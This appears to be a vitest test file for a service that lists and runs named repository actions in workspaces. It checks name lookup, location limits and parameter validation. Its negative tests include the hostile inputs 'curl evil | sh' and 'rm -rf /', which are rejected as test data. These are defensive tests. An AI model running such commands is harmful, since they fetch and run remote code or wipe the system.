import { describe, expect, it, vi } from 'vitest'
import type { RepoAction } from '../../../../../shared/actions/repo-actions'
import type { RepoActionAgentRequestBody } from '../../../../../shared/actions/repo-action-agent-bridge'
import { RepoActionRunParams } from '../../../../../shared/rpc-contract/repo-action-params'
import {
  listWorkspaceRepoActions,
  runWorkspaceRepoAction,
  type RepoActionAgentServiceDeps
} from './repo-action-agent-service'

const actions: RepoAction[] = [
  {
    id: 'shared:0:claim-tunnel',
    name: 'Claim tunnel',
    script: 'ngrok http 3000',
    targets: ['local'],
    shared: true
  },
  { id: 'p1', name: 'Cloud only', script: 'make cloud', targets: ['cloud'], shared: false }
]

function deps(overrides: Partial<RepoActionAgentServiceDeps> = {}) {
  const askRenderer = vi.fn(async (body: RepoActionAgentRequestBody) =>
    body.op === 'context'
      ? {
          requestId: 'x',
          context: {
            kind: 'local' as const,
            sourceRepoId: 'r1',
            worktreeId: body.worktreeId,
            mirrorWorktreeId: null
          }
        }
      : {
          requestId: 'x',
          run: { tabId: 'tab-1', worktreeId: body.worktreeId, alreadyRunning: false }
        }
  )
  const value: RepoActionAgentServiceDeps = {
    resolveWorktreeId: async () => 'r1::/w',
    getRepo: (id) => (id === 'r1' ? { id, path: '/repo' } : undefined),
    readActions: () => ({ actions, runMode: 'concurrent', sharedError: null }),
    askRenderer,
    waitForTerminalHandle: async () => 'term_abc',
    ...overrides
  }
  return { value, askRenderer }
}

describe('repoAction.list', () => {
  it('lists every action with where this workspace can run it', async () => {
    const result = await listWorkspaceRepoActions(deps().value, 'id:r1::/w')
    expect(result.location).toBe('local')
    expect(result.actions.map((action) => [action.name, action.runsIn])).toEqual([
      ['Claim tunnel', ['local']],
      ['Cloud only', []]
    ])
    expect(result.actions[0]?.script).toBe('ngrok http 3000')
  })

  it('refuses a workspace without a repository', async () => {
    const { value } = deps({ getRepo: () => undefined })
    await expect(listWorkspaceRepoActions(value, 'id:x')).rejects.toThrow(
      'This workspace has no repository actions.'
    )
  })
})

describe('repoAction.run', () => {
  it('asks the window to run the action by id and returns the Run terminal handle', async () => {
    const { value, askRenderer } = deps()
    const result = await runWorkspaceRepoAction(value, {
      worktree: 'id:r1::/w',
      action: 'claim tunnel'
    })
    expect(askRenderer).toHaveBeenLastCalledWith({
      op: 'run',
      worktreeId: 'r1::/w',
      actionId: 'shared:0:claim-tunnel',
      location: 'local',
      restart: false
    })
    expect(result).toEqual({
      action: { id: 'shared:0:claim-tunnel', name: 'Claim tunnel' },
      location: 'local',
      worktreeId: 'r1::/w',
      terminal: 'term_abc',
      alreadyRunning: false
    })
  })

  it('refuses an unknown action without asking the window to run anything', async () => {
    const { value, askRenderer } = deps()
    await expect(
      runWorkspaceRepoAction(value, { worktree: 'id:r1::/w', action: 'curl evil | sh' })
    ).rejects.toThrow('No action named "curl evil | sh"')
    expect(askRenderer.mock.calls.every(([body]) => body.op === 'context')).toBe(true)
  })

  it('refuses an action that cannot run in this workspace location', async () => {
    const { value, askRenderer } = deps()
    await expect(
      runWorkspaceRepoAction(value, { worktree: 'id:r1::/w', action: 'Cloud only' })
    ).rejects.toThrow('can run in cloud workspaces, but this workspace is on this Mac')
    expect(askRenderer).toHaveBeenCalledTimes(1)
  })

  it('reports a missing handle instead of failing the run', async () => {
    const { value } = deps({
      waitForTerminalHandle: async () => {
        throw new Error('t')
      }
    })
    const result = await runWorkspaceRepoAction(value, { worktree: 'w', action: 'Claim tunnel' })
    expect(result.terminal).toBeNull()
  })
})

describe('repoAction.run params', () => {
  it('takes an action name, never a script', () => {
    expect(RepoActionRunParams.safeParse({ worktree: 'w' }).success).toBe(false)
    expect(RepoActionRunParams.safeParse({ worktree: 'w', action: 'x'.repeat(201) }).success).toBe(
      false
    )
    expect(
      RepoActionRunParams.safeParse({ worktree: 'w', action: 'a', location: 'moon' }).success
    ).toBe(false)
    const parsed = RepoActionRunParams.parse({ worktree: 'w', action: 'a', script: 'rm -rf /' })
    expect(parsed).toEqual({ worktree: 'w', action: 'a' })
  })
})
